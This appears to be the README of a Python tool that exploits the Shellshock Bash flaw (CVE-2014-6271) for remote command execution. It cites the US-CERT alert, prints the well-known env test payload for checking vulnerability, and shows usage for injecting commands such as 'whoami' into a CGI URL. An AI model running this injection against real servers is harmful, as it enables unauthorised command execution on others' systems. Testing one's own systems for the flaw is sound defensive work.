Shellshock ( Bash CVE-2014-6271 ) Remote Command Execution Injector
=============
<h1>Overview</h1>
A critical vulnerability has been reported in the GNU Bourne-Again Shell (Bash), the common command-line shell used in many Linux/UNIX operating systems and Apple’s Mac OS X. The flaw could allow an attacker to remotely execute shell commands by attaching malicious code in environment variables used by the operating system. The United States Department of Homeland Security (DHS) is releasing this Technical Alert to provide further information about the GNU Bash vulnerability.
<a href="https://www.us-cert.gov/ncas/alerts/TA14-268A">Reference</a>
<h1>Verify if your system compromised</h1>
<b>$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</b>
<h1>Usage</h1>
Usage : ./shellsh0ck.py -c "command" -u "vulnsite" -m 1/2 <br>
Ex : ./shellsh0ck.py -c "whoami" -u "http://127.0.0.1/snoww0lf.cgi" -m 1 <br>
More info : ./shellsh0ck.py -h 

<b>Make sure you have installed "curl" in your system before you'll using this file.</b>
